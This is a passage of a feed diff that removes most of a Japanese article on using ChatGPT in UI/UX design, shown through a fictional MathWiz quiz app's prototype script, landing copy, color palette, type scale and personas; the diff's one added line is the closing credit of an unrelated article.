-・スライド1：「MathWizへようこそ！楽しいクイズやチャレンジ問題で数学をマスターしよう。」<br>
-　・黒板に数学の問題を解いているキャラクターのイラストを入れる。<br>
-・スライド2：「幅広い選択肢からトピックを選び、自分に合った学習体験を作ろう。」<br>
-　・算数、代数、幾何学など、数学のさまざまなトピックを表すアイコンを表示<br>
-・スライド3：「バッジを獲得し、デイリークエストを実施し、学習の進捗を管理しよう。」<br>
-　・成果を表すバッジコレクションとプログレスバーを表示<br>
-・スライド4：「準備はいいですか？新規登録またはログインして学習プロセスを始めましょう！」<br>
-　・「新規登録」と「ログイン」のボタンを含める<br></p>
-</li>
-<li>
-<p>ホーム画面：<br>
-・ウェルカムメッセージと、一人ひとりに合わせたおすすめクイズを表示<br>
-　・テキスト例：「[ユーザー名]さん、お帰りなさい！[ユーザー名]さんにおすすめのクイズをご案内します。」<br>
-・水平スクロール可能なおすすめクイズリスト（画像、タイトル）を含める<br>
-・画面下部に「トピック」「デイリークエスト」「プロフィール」に移動するためのアイコンを表示<br></p>
-</li>
-<li>
-<p>トピック画面：<br>
-・算数、代数、幾何学、三角法、微分積分など、数学のトピックの一覧を表示<br>
-・画面上部にトピックを検索するための検索バーを含める<br>
-　・難易度や学年に応じてトピックを絞り込むためのフィルターを追加する<br>
-　・サブトピックやクイズにアクセスするため、各トピックを選択できるようにする<br></p>
-</li>
-<li>
-<p>サブトピック画面：<br>
-・選択したトピック内のサブトピックのリストを表示<br>
-　・代数の例：線形方程式、二次方程式、多項式、連立方程式<br>
-・クイズにアクセスするため、各トピックを選択できるようにする<br></p>
-</li>
-<li>
-<p>クイズ画面：<br>
-・選択式のクイズ問題とタイマー（該当する場合）を表示<br>
-　・問題例：「次の方程式を解きなさい：2x + 3 = 11」<br>
-　・多肢選択式解答：A) x = 4、B) x = 3、C) x = 2、D) x = 1<br>
-・答えを送信、問題をスキップ、クイズを終了すためのボタンを含める<br>
-　・ボタンテキスト：「送信」「スキップ」「終了」<br>
-・クイズを終えたら、結果とともに正解、解説、獲得ポイントを表示<br>
-　・テキスト例：「おめでとうございます！80ポイント獲得しました。以下の正解と解説を確認してください。」<br></p>
-</li>
-<li>
-<p>デイリークエスト画面：<br>
-・利用可能なデイリークエストとそれぞれのリワード（ポイント、バッジ）を表示<br>
-　・クエスト例：「幾何学クイズを5問答えて50ポイントと幾何学マスターバッジを獲得しよう。」<br>
-・プログレスバーで各クエストのステータス（実施済みかどうか）を表示<br>
-　・テキスト例：進捗：5問中3問完了）<br>
-・クエストの開始ボタンを含める<br>
-　・ボタンテキスト：「クエスト開始」<br></p>
-</li>
-</ol><p>このスクリプトをもとに、MathWizアプリのフローとデザインを効果的に紹介するFigmaプロトタイプを作成することができます。それにより、ステークホルダーはユーザーエクスペリエンスを視覚化し、アプリの機能と外観についてフィードバックすることができます。</p></div></div>
-</details>
-<h2>テキストコンテンツの生成</h2>
-<p>AIは、製品のランディングページやその他の部分に表示するさまざまなテキストを効率的に生成することができ、便利です。自動化により作業効率を向上させ、テキスト作成に要する時間を削減することができます。</p>
-<p><img src="https://hackernoon.imgix.net/images/Hj6zDcAXL9SsFN0sThCgcr0SQva2-ncj3a0m.jpeg">
-<em>テキストコンテンツの生成</em></p>
-<details>
-<summary><strong>画像内テキストの翻訳</strong></summary>
-<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>MathWizアプリのランディングページ用のコピー文を作成してください。</p><p><strong>MathWiz – 楽しいクイズとチャレンジ問題で数学をマスターしよう</strong></p><p>思わず引き込まれてしまうクイズや、わくわくするチャレンジ問題を通じて、数学を学ぶ楽しさを発見してください。MathWizは、自分のペースで数学をマスターできる究極のアプリです。退屈な数学のレッスンにおさらばして、自分のレベルや目標に合わせた学習体験を始めましょう。</p><p><strong>特長：</strong></p><p>幅広いトピック</p><p>算数から代数、幾何学、微分積分に至るまで、MathWizは包括的なトピックとサブトピックを提供しており、年齢や能力を問わずあらゆる学習者にご利用いただけます。</p><p>アダプティブラーニング</p><p>独自のスマートアルゴリズムにより、ユーザーの成績に応じてクイズの難易度を調整し、真に個別化された学習体験を提供します。適度に難しい問題なので、圧倒されることもなく興味が続きます。</p><p>ゲーミフィケーションとリワード</p><p>クイズやデイリークエストをこなしてポイントを獲得し、バッジを解放し、リーダーボードの上位ランクインを目指しましょう。フレンドと競い合ったり、学習プロセスの新しいマイルストーン到達を目指して頑張りましょう。</p><p>パフォーマンスの追跡</p><p>自分の強みや改善が必要な部分、トピックごとの成績などを示した視覚的に魅力的なチャートや分析結果で、進捗を把握しましょう。</p><p>共同学習</p><p>インタラクティブな学習コミュニティを通じてフレンドとつながり、クイズやチャレンジ問題を送り、数学の問題について話し合い、成果を共有しましょう。</p><p>アクセシビリティと優れた操作性</p><p>iOS向けに開発されたMathWizは、直感的なインターフェース、カスタマイズ可能なアバター、そして誰もが楽しくシームレスな学習体験を味わうことを可能にするさまざまなアクセシビリティ機能を提供します。</p><p><strong>MathWizで内に秘めた数学のポテンシャルを解き放とう</strong></p><p>楽しさ満載の数学アドベンチャーに出発する用意はいいですか？今すぐMathWizをダウンロードして、やりがいを感じながら楽しく学べるクイズやチャレンジ問題を通じて数学をマスターしましょう。</p><p><strong>［App Storeでダウンロードボタン］</strong></p><p>［ユーザーの声をカルーセルで表示—満足したユーザーのコメントを表示し、アプリのメリットと有効性を強調する］</p><p>［フッター—SNS、プライバシーポリシー、利用規約、サポート／問い合わせ窓口情報を含める］</p></div></div>
-</details>
-<h2>デザインシステムのドキュメント作成の加速</h2>
-<p>ChatGPTは、コンポーネントやその使用方法の説明を自動的に生成してくれるため、デザインシステムのドキュメント作成プロセスを容易にします。そのため、デザイナーはプロジェクトの重要な部分に注力でき、ドキュメントの一貫性や分かりやすさを確保することができます。</p>
-<p>では、例としてAIが作成したカラーパレットの詳細な説明を見てみましょう。カラーパレットの説明にはデザイントークンも含まれ、その他にタイプスケールも作成してみました。</p>
-<p><img src="https://hackernoon.imgix.net/images/Hj6zDcAXL9SsFN0sThCgcr0SQva2-m3k3aas.jpeg">
-<em>カラーパレットの制作</em></p>
-<details>
-<summary><strong>画像内テキストの翻訳</strong></summary>
-<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>先ほど提供した色情報を使用して、デザインシステムのカラーパレットを作成してください。名前、16進コード、デザイントークン名、色の使用目的を含め、表にまとめてください。</p><table>
-<thead>
-<tr>
-<th>名前</th>
-<th>16進コード</th>
-<th>デザイントークン</th>
-<th>使用目的</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>ディープブルー</td>
-<td>#274472</td>
-<td>--color-brand</td>
-<td>アプリのロゴ<br>ヘッダー<br>ナビゲーションの主要要素</td>
-</tr>
-<tr>
-<td>ライトブルー</td>
-<td>#4B8BBE</td>
-<td>--color-primary-1</td>
-<td>背景<br>ボタン<br>インタラクティブ要素</td>
-</tr>
-<tr>
-<td>ティール</td>
-<td>#009688</td>
-<td>--color-primary-2</td>
-<td>アクセント<br>CTAボタン<br>重要な情報</td>
-</tr>
-<tr>
-<td>ソフトイエロー</td>
-<td>#FFEB3B</td>
-<td>--color-secondary-1</td>
-<td>進捗インジケータ<br>バッジ<br>リワード</td>
-</tr>
-<tr>
-<td>ライトグレー</td>
-<td>#F5F5F5</td>
-<td>--color-secondary-2</td>
-<td>背景<br>コントラスト効果（強烈すぎず、注意をそらさない）</td>
-</tr>
-<tr>
-<td>ダークグレー</td>
-<td>#616161</td>
-<td>--color-secondary-3</td>
-<td>テキストとアイコン<br>クリーンでモダンな外観を保ちつつ可読性を確保</td>
-</tr>
-<tr>
-<td>セカンダリーテキスト</td>
-<td>#757575</td>
-<td>--color-text-2</td>
-<td>セカンダリーテキスト要素（キャプション、ラベル、重要性の低い情報など）</td>
-</tr>
-<tr>
-<td>エラー</td>
-<td>#D32F2F</td>
-<td>--color-error</td>
-<td>エラーメッセージ<br>アラート<br>問題やトラブルを知らせる通知</td>
-</tr>
-<tr>
-<td>グレー1</td>
-<td>#E0E0E0</td>
-<td>--color-gray-1</td>
-<td>淡い背景<br>境界線<br>セパレーター</td>
-</tr>
-<tr>
-<td>グレー2</td>
-<td>#BDBDBD</td>
-<td>--color-gray-2</td>
-<td>無効化された要素<br>無効なボタン<br>入力</td>
-</tr>
-<tr>
-<td>グレー3</td>
-<td>#9E9E9E</td>
-<td>--color-gray-3</td>
-<td>プレースホルダーテキスト<br>優先度の低い情報</td>
-</tr>
-</tbody>
-</table><p>この表は、MathWizアプリのデザインシステム用のカラーパレットを表し、各色の名前、16進コード、デザイントークン名、使用目的を含みます。このような形で整理することで、アプリのビジュアルデザインを通して一貫性を保ち、デザイナーや開発者が適切な色を参照して適用しやすくなるでしょう。</p></div></div>
-</details>
-<p><img src="https://hackernoon.imgix.net/images/Hj6zDcAXL9SsFN0sThCgcr0SQva2-axl3a6a.jpeg">
-<em>デザインシステムの作成</em></p>
-<details>
-<summary><strong>画像内テキストの翻訳</strong></summary>
-<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>iOS向けのアプリであることを踏まえ、MathWizデザインシステム用のタイプスケールを作成してください。</p><p>タイプスケールとは、フォントサイズ、フォントの太さ、行の高さを整理したものであり、デザインシステムにおいてタイポグラフィの視覚的階層を生み出します。以下はMathWizアプリのデザインシステム用のタイプスケールで、iOSのモバイルアプリ向けに作成されています。</p><table>
-<thead>
-<tr>
-<th>レベル</th>
-<th>フォントサイズ</th>
-<th>行の高さ</th>
-<th>フォントの太さ</th>
-<th>用途</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>ディスプレイ</td>
-<td>32</td>
-<td>40</td>
-<td>ボールド</td>
-<td>アプリのタイトル<br>オンボーディング画面の大見出し<br>特別プロモーション</td>
-</tr>
-<tr>
-<td>見出し</td>
-<td>28</td>
-<td>36</td>
-<td>ボールド</td>
-<td>セクション見出し<br>ダッシュボードタイル</td>
-</tr>
-<tr>
-<td>サブ見出し</td>
-<td>24</td>
-<td>32</td>
-<td>セミボールド</td>
-<td>サブセクション見出し<br>CTAボタン<br>クイズタイトル</td>
-</tr>
-<tr>
-<td>本文</td>
-<td>20</td>
-<td>28</td>
-<td>レギュラー</td>
-<td>本文<br>クイズ問題<br>リスト項目<br>ラベル</td>
-</tr>
-<tr>
-<td>キャプション</td>
-<td>18</td>
-<td>24</td>
-<td>レギュラー</td>
-<td>本文のセカンダリーテキスト<br>キャプション<br>ツールチップ</td>
-</tr>
-<tr>
-<td>ラベル</td>
-<td>16</td>
-<td>22</td>
-<td>レギュラー</td>
-<td>小ラベル<br>入力欄<br>ナビゲーション項目</td>
-</tr>
-<tr>
-<td>細字</td>
-<td>14</td>
-<td>20</td>
-<td>レギュラー</td>
-<td>細字<br>利用規約<br>プライバシーポリシー</td>
-</tr>
-</tbody>
-</table><p>注：フォントサイズは、画面サイズや解像度が異なる場合でもアクセシビリティと一貫したユーザーエクスペリエンスを確保するため、sp（スケール非依存ピクセル）で指定します。</p><p>MathWizアプリデザインシステムでこのタイプスケールを使用することにより、一貫性のあるタイポグラフィ階層を維持し、可読性を高めるとともに、視覚的に魅力的なユーザーエクスペリエンスを創出することができます。前に提案したフォントペア（見出しはRoboto、本文はOpen Sans、など）を使用することで、アプリのデザインをより一層高めましょう。</p></div></div>
-</details>
-<h2>UXタスクの自動化</h2>
-<p>ChatGPTを使用することで、ユーザー手順の分析やペルソナの特定、詳細な情報アーキテクチャの構築といったUX関連の複雑な作業を自動化できます。AIが詳細なデータ分析を行ってくれるので、よりインテリジェントで効果的なソリューションを作成できます。</p>
-<p>例として、MathWizアプリのユーザーペルソナをいくつか作成したので見てみましょう。</p>
-<p><img src="https://hackernoon.imgix.net/images/Hj6zDcAXL9SsFN0sThCgcr0SQva2-1zm3aip.jpeg">
-<em>ユーザーペルソナ</em></p>
-<details>
-<summary><strong>画像内テキストの翻訳</strong></summary>
-<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>UXペルソナとは、ユーザーベースを代表するユーザーに関する情報や知見を集約したものであり、主要なタイプと考えられるユーザー像（メインペルソナ）です。必要に応じて他にもいくつかのペルソナを作成します。MathWizアプリ用にUXペルソナを3つ生成してください。</p><p>ペルソナ1：<strong>メインペルソナ</strong></p><p><strong>名前</strong>：ソフィア<br>
-<strong>年齢</strong>：14歳<br>
-<strong>職業</strong>：生徒<br>
-<strong>場所</strong>：米国ニューヨーク州<br>
-<strong>略歴</strong>：ソフィアは勉強が大好きな高校生で、クラスでも良い成績を収めています。特に数学が好きで、数学コンテストに好んで参加しています。暇があればスマホでパズルゲームをして遊んでいます。<br></p><p><strong>目標</strong>：</p><ol>
-<li>数学の力をつけて、数学コンテストで優位に立つ。</li>
-<li>数学の練習問題を解ける、楽しくて夢中になれるアプリを見つける。</li>
-<li>進捗を確認し、改善できる部分を見つける。</li>
-</ol><p><strong>ペインポイント</strong>：</p><ol>
-<li>彼女のレベルに合った難しい数学問題があまりない。</li>
-<li>従来の数学の勉強方法ではモチベーションを保てない。</li>
-<li>学校の勉強と課外活動、自由時間のバランスがをうまくとれない。</li>
-</ol><p>ペルソナ2：<strong>セカンダリーペルソナ</strong></p><p><strong>名前</strong>：イーサン<br>
-<strong>年齢</strong>：35歳<br>
-<strong>職業</strong>：エンジニア<br>
-<strong>場所</strong>：米国テキサス州オースティン<br>
-<strong>略歴</strong>：イーサンは土木技師で、仕事で頻繁に数学を使用します。大学時代に比べて自分の数学の知識が少しサビついてきていると感じており、手軽に知識をリフレッシュして能力を維持できる方法を探しています。<br></p><p><strong>目標</strong>：</p><ol>
-<li>数学の練習問題を定期的に解き、スキルの維持・向上を図る。</li>
-<li>今の自分のレベルに合った、個別化された学習体験を提供するアプリを見つける</li>
-<li>仕事の休憩時間や通勤時間にアプリを使う。</li>
-</ol><p><strong>ペインポイント</strong>：</p><ol>
-<li>数学のスキル向上に費やせる時間が限られている。</li>
-<li>幅広い数学のトピックに対応したプラットフォームがなかなか見つからない。</li>
-<li>柔軟なスケジュールで学べるアプリが必要。</li>
-</ol><p>ペルソナ3：<strong>セカンダリーペルソナ</strong></p><p><strong>名前</strong>：グレイス<br>
-<strong>年齢</strong>：27歳<br>
-<strong>職業</strong>：小学校教師<br>
-<strong>場所</strong>：米国カリフォルニア州ロサンゼルス<br>
-<strong>略歴</strong>：グレイスは小学校の教師であり、生徒が算数の知識を身につける手助けをしたいと思っています。生徒や保護者に勧められる面白い教育アプリを常に探しています。<br></p><p><strong>目標</strong>：</p><ol>
-<li>面白くて勉強になる、生徒に適した算数（数学）アプリを見つける。</li>
-<li>生徒たちに学校以外の時間でも算数の練習をするよう促す。</li>
-<li>生徒の進捗を確認し、アプリの有効性を評価する。</li>
-</ol><p><strong>ペインポイント</strong>：</p><ol>
-<li>さまざまなレベルに対応できて、年齢的にも相応しい算数（数学）アプリが見つからない。</li>
-<li>生徒に安全でフレンドリーな環境を提供するアプリが必要。</li>
-<li>生徒が飽きないよう、学びと楽しさのバランスが取れたアプリが必要。</li>
-</ol></div></div>
-</details>
-<h2>ユーザー調査の実施</h2>
-<p>ChatGPTはユーザーからのフィードバックを自動的に分析し、重要な問題やトレンドを示し、製品のさまざまな側面についての分かりやすさや有効性についてレポートを生成することができます。デザイナーはユーザーのニーズにより素早く対応し、製品に適切な変更を加えることができます。</p>
-<h2>効果的なコミュニケーションの確保</h2>
-<p>ChatGPTは、技術用語や複雑な概念を分かりやすく説明することで、デザイナーや開発者、その他のチームメンバーがコミュニケーションを取りやすくしてくれます。チーム全員がプロジェクトの目標や要件を理解し、連携を深め、より短時間で成果を出せるよう手助けしてくれます。</p>
-<h2>ChatGPTを使って他にできること</h2>
-<ul>
-<li>ユーザーストーリー、シナリオ、ユーザージャーニーマップ、ユーザーフローの作成</li>
-<li>デザインやテキストのABテストの選択肢作成</li>
-<li>デザインスプリントの計画</li>
-<li>ポートフォリオ用の独自ケース作成</li>
-<li>記事や投稿、その他デザイン関連作業のアイデア出し</li>
-<li>専門能力の開発</li>
-<li>続く</li>
-</ul>
-<h2>結論の代わりに</h2>
-<p>条件付きのMathWizアプリの例を用いて、UI/UXデザイナーやプロダクトデザイナーが仕事でChatGPTを使用する具体的な方法を説明しましたが、ご自身の仕事にも適用可能な有益な情報はありましたでしょうか。</p>
-<p>最後に、ネット上で最も頻繁にされている質問の1つについて考えてみたいと思います。</p>
-<p><strong>AIがデザイナーに取って代わり、その仕事を奪う日は来るのでしょうか？</strong></p>
-<p>ドラムロール…
-AIが近い将来デザインの仕事を完全に置き換える可能性は極めて低いと思います（ただし、反復作業や自動化できる作業は除きます）。なぜでしょうか。それは、あらゆるビジネスは個別化されたケースであり、ユーザーグループやその他さまざまな要素についても同じことが言えるからです。デザインは、視覚対象物の創出にとどまらず、共感性や創造性、人間中心のアプローチによる問題解決なども関わる仕事です。これらのスキルは、AIが容易に再現できるものではありません。</p>
-<p>したがって、ChatGPTはAIのパーソナルアシスタントと見なすことができるでしょう。そのようなものであれば、誰もが欲しいと思うのではないでしょうか。現にこのようなツールがすでに存在するので、使い方を学ぼうではありませんか。</p>
-<p>それでは最後のコメントです。<strong>AIがデザイナーに取って代わることはないでしょう。しかし、AIを利用しなければ、AIを使うデザイナーに淘汰されるかもしれません</strong>。</p>]]></content:encoded></item></channel></rss>
+<p>この記事は以前<a href="https://www.techtello.com/analysis-paralysis/?ref=hackernoon.com">こちら</a>で公開されたものです。他の記事にも興味のある方は、<a href="https://www.linkedin.com/in/sagivini/?ref=hackernoon.com">LinkedIn</a>またはこちらをぜひフォローしてください。</p>]]></content:encoded></item></channel></rss>
